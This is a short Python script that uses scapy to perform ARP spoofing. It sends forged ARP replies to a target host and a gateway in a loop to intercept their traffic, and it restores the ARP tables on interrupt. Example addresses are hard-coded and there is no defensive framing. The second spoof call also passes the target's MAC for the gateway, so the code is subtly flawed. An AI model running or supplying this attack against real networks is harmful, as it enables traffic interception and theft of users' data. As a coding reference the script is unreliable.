import scapy.all as scapy
import os
import sys
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if len(answered_list) == 0:
        return None
    else:
        return answered_list[0][1].hwsrc

def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    if target_mac is None:
        print(f"Could not find MAC address for target IP address {target_ip}")
        sys.exit()

    while True:
        try:
            spoof(target_ip, target_mac, spoof_ip)
            spoof(spoof_ip, target_mac, target_ip)
            print(f"[+] Sent spoofed ARP packets to target IP {target_ip} and spoof IP {spoof_ip}")
            time.sleep(2)
        except KeyboardInterrupt:
            print("\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
            restore(target_ip, target_mac, spoof_ip, get_mac(spoof_ip))
            restore(spoof_ip, get_mac(spoof_ip), target_ip, target_mac)
            break

# Example usage
target_ip = "192.168.1.2"
spoof_ip = "192.168.1.1"
arp_spoof(target_ip, spoof_ip)
